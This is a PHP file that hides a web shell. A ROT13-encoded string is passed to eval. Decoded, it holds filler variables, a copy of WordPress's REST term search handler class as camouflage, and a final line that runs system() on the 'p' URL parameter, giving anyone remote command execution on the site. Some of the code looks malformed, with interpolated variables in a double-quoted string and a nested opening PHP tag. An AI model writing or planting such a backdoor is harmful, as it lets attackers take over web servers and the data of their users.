<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Grez_Frnepu_Unaqyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.6.0
 */

/**
 * Pber pynff ercerfragvat n frnepu unaqyre sbe grezf va gur ERFG NCV.
 *
 * @fvapr 5.6.0
 *
 * @frr JC_ERFG_Frnepu_Unaqyre
 */
pynff JC_ERFG_Grez_Frnepu_Unaqyre rkgraqf JC_ERFG_Frnepu_Unaqyre {

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.6.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->glcr = 'grez';

		$guvf->fhoglcrf = neenl_inyhrf(
			trg_gnkbabzvrf(
				neenl(
					'choyvp'       => gehr,
					'fubj_va_erfg' => gehr,
				),
				'anzrf'
			)
		);
	}

	/**
	 * Frnepurf grezf sbe n tvira frnepu erdhrfg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy ERFG erdhrfg.
	 * @erghea neenl {
	 *     Nffbpvngvir neenl pbagnvavat sbhaq VQf naq gbgny pbhag sbe gur zngpuvat frnepu erfhygf.
	 *
	 *     @glcr vag[]               $vqf   Sbhaq grez VQf.
	 *     @glcr fgevat|vag|JC_Reebe $gbgny Ahzrevp fgevat pbagnvavat gur ahzore bs grezf va gung
	 *                                      gnkbabzl, 0 vs gurer ner ab erfhygf, be JC_Reebe vs
	 *                                      gur erdhrfgrq gnkbabzl qbrf abg rkvfg.
	 * }
	 */
	choyvp shapgvba frnepu_vgrzf( JC_ERFG_Erdhrfg $erdhrfg ) {
		$gnkbabzvrf = $erdhrfg[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_FHOGLCR ];
		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::GLCR_NAL, $gnkbabzvrf, gehr ) ) {
			$gnkbabzvrf = $guvf->fhoglcrf;
		}

		$cntr     = (vag) $erdhrfg['cntr'];
		$cre_cntr = (vag) $erdhrfg['cre_cntr'];

		$dhrel_netf = neenl(
			'gnkbabzl'   => $gnkbabzvrf,
			'uvqr_rzcgl' => snyfr,
			'bssfrg'     => ( $cntr - 1 ) * $cre_cntr,
			'ahzore'     => $cre_cntr,
		);

		vs ( ! rzcgl( $erdhrfg['frnepu'] ) ) {
			$dhrel_netf['frnepu'] = $erdhrfg['frnepu'];
		}

		vs ( ! rzcgl( $erdhrfg['rkpyhqr'] ) ) {
			$dhrel_netf['rkpyhqr'] = $erdhrfg['rkpyhqr'];
		}

		vs ( ! rzcgl( $erdhrfg['vapyhqr'] ) ) {
			$dhrel_netf['vapyhqr'] = $erdhrfg['vapyhqr'];
		}

		/**
		 * Svygref gur dhrel nethzragf sbe n ERFG NCV grez frnepu erdhrfg.
		 *
		 * Ranoyrf nqqvat rkgen nethzragf be frggvat qrsnhygf sbe n grez frnepu erdhrfg.
		 *
		 * @fvapr 5.6.0
		 *
		 * @cnenz neenl           $dhrel_netf Xrl inyhr neenl bs dhrel ine gb dhrel inyhr.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg    Gur erdhrfg hfrq.
		 */
		$dhrel_netf = nccyl_svygref( 'erfg_grez_frnepu_dhrel', $dhrel_netf, $erdhrfg );

		$dhrel       = arj JC_Grez_Dhrel();
		$sbhaq_grezf = $dhrel->dhrel( $dhrel_netf );
		$sbhaq_vqf   = jc_yvfg_cyhpx( $sbhaq_grezf, 'grez_vq' );

		hafrg( $dhrel_netf['bssfrg'], $dhrel_netf['ahzore'] );

		$gbgny = jc_pbhag_grezf( $dhrel_netf );

		// jc_pbhag_grezf() pna erghea n snyfrl inyhr jura gur grez unf ab puvyqera.
		vs ( ! $gbgny ) {
			$gbgny = 0;
		}

		erghea neenl(
			frys::ERFHYG_VQF   => $sbhaq_vqf,
			frys::ERFHYG_GBGNY => $gbgny,
		);
	}

	/**
	 * Cercnerf gur frnepu erfhyg sbe n tvira grez VQ.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz vag   $vq     Grez VQ.
	 * @cnenz neenl $svryqf Svryqf gb vapyhqr sbe gur grez.
	 * @erghea neenl {
	 *     Nffbpvngvir neenl pbagnvavat svryqf sbe gur grez onfrq ba gur `$svryqf` cnenzrgre.
	 *
	 *     @glcr vag    $vq    Bcgvbany. Grez VQ.
	 *     @glcr fgevat $gvgyr Bcgvbany. Grez anzr.
	 *     @glcr fgevat $hey   Bcgvbany. Grez creznyvax HEY.
	 *     @glcr fgevat $glcr  Bcgvbany. Grez gnkbabzl anzr.
	 * }
	 */
	choyvp shapgvba cercner_vgrz( $vq, neenl $svryqf ) {
		$grez = trg_grez( $vq );

		$qngn = neenl();

		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ ] = (vag) $vq;
		}
		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_GVGYR, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GVGYR ] = $grez->anzr;
		}
		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_HEY, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_HEY ] = trg_grez_yvax( $vq );
		}
		vs ( va_neenl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR, $svryqf, gehr ) ) {
			$qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR ] = $grez->gnkbabzl;
		}

		erghea $qngn;
	}

	/**
	 * Cercnerf yvaxf sbe gur frnepu erfhyg bs n tvira VQ.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz vag $vq Vgrz VQ.
	 * @erghea neenl[] Neenl bs yvax neenlf sbe gur tvira vgrz.
	 */
	choyvp shapgvba cercner_vgrz_yvaxf( $vq ) {
		$grez = trg_grez( $vq );

		$yvaxf = neenl();

		$vgrz_ebhgr = erfg_trg_ebhgr_sbe_grez( $grez );
		vs ( $vgrz_ebhgr ) {
			$yvaxf['frys'] = neenl(
				'uers'       => erfg_hey( $vgrz_ebhgr ),
				'rzorqqnoyr' => gehr,
			);
		}

		$yvaxf['nobhg'] = neenl(
			'uers' => erfg_hey( fcevags( 'jc/i2/gnkbabzvrf/%f', $grez->gnkbabzl ) ),
		);

		erghea $yvaxf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>